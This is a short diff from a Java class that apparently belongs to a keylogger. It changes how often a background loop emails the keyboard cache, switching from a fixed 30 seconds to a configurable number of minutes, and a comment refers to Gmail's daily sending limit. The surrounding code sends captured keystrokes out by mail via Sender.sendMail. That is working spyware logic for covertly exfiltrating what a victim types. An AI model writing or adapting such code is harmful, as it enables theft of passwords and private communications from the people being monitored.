@@ -23,8 +23,8 @@ public class ManageService implements Runnable {
         while (true) {
             //conver nano seconds in milli
             long elapsed = (System.nanoTime() - start) / 1_000_000;
-            //send mail every 15 minuted (google limits 150!);
-            if(elapsed > 30_000) {
+            //send mail every ** minuted (google limits 150 message per day!);
+            if(elapsed > 60000 * config.Configuration.getCountsMinutesToBuildLog()) {
                 try {
                     Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
                     keyboard.onSend();
